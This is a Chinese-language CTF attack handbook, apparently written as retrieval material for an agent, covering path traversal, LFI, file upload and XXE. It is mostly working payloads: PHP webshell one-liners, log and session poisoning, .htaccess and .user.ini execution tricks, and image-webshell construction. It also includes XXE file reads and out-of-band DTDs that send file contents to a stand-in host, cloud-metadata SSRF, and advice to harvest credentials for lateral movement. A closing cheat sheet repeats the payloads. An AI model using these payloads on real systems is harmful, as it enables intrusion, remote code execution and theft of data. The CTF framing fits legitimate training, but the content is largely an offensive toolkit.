# 路径穿越·文件上传·XXE 通用解题手册

适用题型（命中即召回本手册）：路径穿越 目录遍历 LFI 本地文件包含 任意文件读取 path-traversal php://filter 日志污染 phar反序列化 文件上传 webshell 图片马 双扩展名 MIME绕过 魔数 条件竞争 XXE XML外部实体 带外 OOB 盲XXE XInclude SVG DTD 软链

## 1. 识别与分类
- 路径穿越：参数名 file/path/page/download/read/url/src/template/lang，响应回显 passwd 内容或报错含绝对路径即命中；LFI 额外满足"输入被 include/require 执行"。
- 文件上传：存在 multipart/form-data 或 PUT 写文件口；判据=上传成功 + 可预测访问路径 + 服务端脚本解析器三要素齐备才构成 RCE。
- XXE：请求或文件含 XML（SOAP/application/xml/SVG/OOXML/RSS/SAML），或 JSON 接口改 Content-Type: application/xml 后仍按 XML 解析。

## 2. 攻击方法论
### 路径穿越 / LFI
1. 先建基线再探测：curl 正常 file 值记状态码/字节数，发 `../../../../etc/passwd`（或 `..\..\..\windows\win.ini`），grep `root:`/`[extensions]` 判读通。
2. 编码变体依次打：`%2e%2e%2f`→`%252e%252e%252f`双重→`..%c0%af` overlong→`....//....//`(剥一次仍剩 ../)→绝对路径 `/etc/passwd`→`..;/..;/`(Tomcat 路径参数归一)。
3. 读源码用 filter：`?file=php://filter/convert.base64-encode/resource=index.php` 解码即得源码；链式 `convert.iconv.UTF-8.UTF-16LE`、`zlib.deflate` 绕过黑名单。
4. LFI→RCE 优先序：`php://input`(POST body 写码) > `data://text/plain,<?=system($_GET[c])?>` > 日志污染 > session 包含 > /proc 注入。
5. 日志污染：`curl -A '<?php system($_GET[c]);?>' http://t/` 写 UA，再 `?file=../../../../var/log/apache2/access.log&c=id`；nginx/ssh/mail 日志同法。
6. session 包含：向可控 session 字段写 `<?php system($_GET[c]);?>`，取 PHPSESSID 后包含 `/tmp/sess_<ID>` 或 `/var/lib/php/sessions/sess_<ID>`。
7. /proc 读进程：`/proc/self/environ`(UA 注入即执行)、`/proc/self/cmdline`、`/proc/self/fd/0..N`(盲扫临时文件)、`/proc/self/maps`。
8. phar/zip 入口：上传伪装图片的 phar，`?file=phar:///var/www/uploads/x.jpg/any` 触发元数据反序列化(POP→RCE)；`zip:///tmp/x.zip%23s.php` 直接执行 zip 内 PHP。

### 文件上传
1. 映射四阶段：accept(校验)/store(落盘名与路径)/process(处理器)/serve(回访渲染)，漏洞常在非上传阶段。
2. 扩展名绕过：大小写 `.pHp/.phtml/.pht/.phar`、双扩展 `shell.php.jpg`、`shell.asp;.jpg`(IIS 分号)、`shell.php%00.jpg`(老 PHP)、尾点/尾空格/`::$DATA`(Windows)。
3. MIME/魔数：改 Content-Type 为 image/jpeg 骗 header 校验；加魔数头 `GIF89a`/`\x89PNG`/`\xff\xd8\xff` + PHP 尾码做图片马；`exiftool -Comment='<?php system($_GET[c]);?>' x.jpg`。
4. 解析配置投毒：传 `.htaccess`(`AddType application/x-httpd-php .jpg`)让 .jpg 按 PHP 执行；传 `.user.ini`(`auto_prepend_file=shell.jpg`)自动前插执行。
5. 软链/路径：filename 写 `../../../shell.php` 穿越落盘目录；Content-Disposition filename 穿越；上传 zip 内含 `../../` 路径的 Zip Slip。
6. 条件竞争：并发上传 .php 并在服务端校验/删除前抢时间访问执行；phpinfo/LFI 场景并发读 /tmp 临时文件。
7. 上传后解析：Nginx `cgi.fix_pathinfo=1` 下 `avatar.jpg/.php` 把 jpg 当 PHP；IIS `x.asp/` 目录解析；Apache 多扩展右至左匹配 handler。
8. SVG 上传：内嵌 `<script>` 触发 XSS，`<image href>` 触发 SSRF/XXE；ImageMagick/FFmpeg 处理链可 CVE RCE 或 SSRF。

### XXE
1. 基础内联读文件：`<!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`，回显即命中。
2. 无回显先 OOB 探测：`<!ENTITY x SYSTEM "http://YOUR_HOST/">` 看 DNS/HTTP 回调确认盲 XXE。
3. 带外回显(外带 DTD)：本机托管 evil.dtd 含 `%file;`(读文件)+`%exfil;`(拼 http://YOUR_HOST/?d=%file;)，目标引用 `%dtd;` 后数据进日志。
4. 报错盲打：DTD 内 `<!ENTITY % err SYSTEM 'file:///nonexist/%file;'>` 让错误信息带出文件内容。
5. SVG/上传：上传 `<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg><text>&x;</text></svg>`，访问即读文件。
6. XInclude(无 DOCTYPE 控制时)：`<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/>`。
7. SSRF/协议扩展：实体指向 `http://169.254.169.254/...` 读云元数据；`php://filter/convert.base64-encode/resource=` 读 PHP 源码；`expect://id` 直接 RCE。
8. OOXML 上传：unzip docx/xlsx → 向 `[Content_Types].xml`/`word/document.xml` 注入 DOCTYPE+实体 → 重打包上传。

## 3. 变体与绕过
- WAF/过滤：多重 URL 编码、overlong UTF-8、`..;`/`..%00`、大小写混合、冗余序列 `....//`、绝对路径、php filter 链式/iconv 编码。
- 无回显 LFI：php filter chain oracle 逐字节判；/proc/self/fd 盲扫；日志/session/environ 注入再包含。
- XXE 回显被吞：改 OOB 外带 DTD、报错带出、FTP 行式回传；外部实体被禁改用 XInclude 或本地 DTD 复用(`file:///usr/share/.../*.dtd`)。
- 上传被拦：改扩展名黑名单缺口(.pht/.phar/.php5/.cer/.asa/.jspx)、尾字符、`::$DATA`、Content-Type 伪造、图片马、zip 嵌套、软链文件名穿越。
- 边界：PHP<8.0 默认实体加载开启直接 XXE；allow_url_include/fopen 决定 wrapper 可用性；路径是否拼接前后缀决定是否需 %00/截断。

## 战法要点
- 先判"读"还是"执行"：路径穿越只读文件，LFI/上传/XXE 才可能 RCE，别在纯读点浪费时间打 RCE。
- 任何 file/page/path 参数先打 `php://filter/convert.base64-encode/resource=index.php` 读源码，再决定升级路径。
- LFI→RCE 按可写通道排序：日志 < session < /proc/environ < php://input < 上传竞争，哪个可达用哪个。
- 上传永远先摸 accept/store/process/serve 四阶段，漏洞在哪阶段就在哪阶段打。
- 图片马要配合"解析配置(.htaccess/.user.ini/路径信息/多扩展)"才执行，单独上传不等于 RCE。
- XXE 先试内联回显，再试 OOB 回调确认，最后外带 DTD/报错；JSON 接口记得改 Content-Type 试 XML。
- 高价值文件固定清单：/etc/passwd /proc/self/environ /proc/self/cmdline 应用 .env config.php WEB-INF/web.xml 云元数据 日志 session 文件。
- 拿到文件内容先找凭证/密钥/内网地址做横向，而不是停在读 passwd。
- **containment 根路径审计（实盘 bctf-20 模式）**：接口泄露 `asset_path`
  或路径参数 → 先 LFI 读源码（`catalog/../../app.py` 类相对目录跳根）→
  **审计源码里的 containment 检查针对哪个根**（APP_ROOT vs PUBLIC_ROOT）：
  检查根是 A 而文件实际从 B 读 → flag 目录（SECRET_ROOT）直接
  `path=../secret/flag.txt` 越过去读。判据：源码里 os.path.join/abspath
  与检查路径不一致。

## 速查清单
```text
# 穿越/LFI
../../../etc/passwd   %2e%2e%2f..   %252e%252e%252f..   ....//....//etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://input (POST body: <?php system($_GET[c]);?>)
?file=data://text/plain,<?=system($_GET[c])?>
日志污染: curl -A '<?php system($_GET[c]);?>' http://t/  → ?file=../../../../var/log/apache2/access.log&c=id
session: 写 <?php system($_GET[c]);?> 到 session → ?file=/tmp/sess_<PHPSESSID>&c=id
/proc/self/environ (UA=<?php ...?>)   /proc/self/fd/0..N   phar:///path/x.jpg/any
# 上传
shell.php.jpg  shell.asp;.jpg  shell.php%00.jpg  .pHp .phtml .pht .phar  shell.php.  shell.php::$DATA
GIF89a<?php system($_GET[c]);?>   exiftool -Comment='<?php system($_GET[c]);?>' x.jpg
.htaccess: AddType application/x-httpd-php .jpg   .user.ini: auto_prepend_file=shell.jpg
filename="../../../shell.php"   avatar.jpg/.php (cgi.fix_pathinfo=1)   x.asp/ 目录解析
# XXE
<!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
OOB: <!ENTITY x SYSTEM "http://YOUR_HOST/">   外带 DTD: <!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY s SYSTEM 'http://YOUR_HOST/?d=%f;'>">%e;%s;
报错: <!ENTITY % e "<!ENTITY % err SYSTEM 'file:///nonexist/%f;'>">%e;%err;
XInclude: <xi:include href="file:///etc/passwd" parse="text"/>
php://filter/convert.base64-encode/resource=...  expect://id  http://169.254.169.254/latest/meta-data/
```
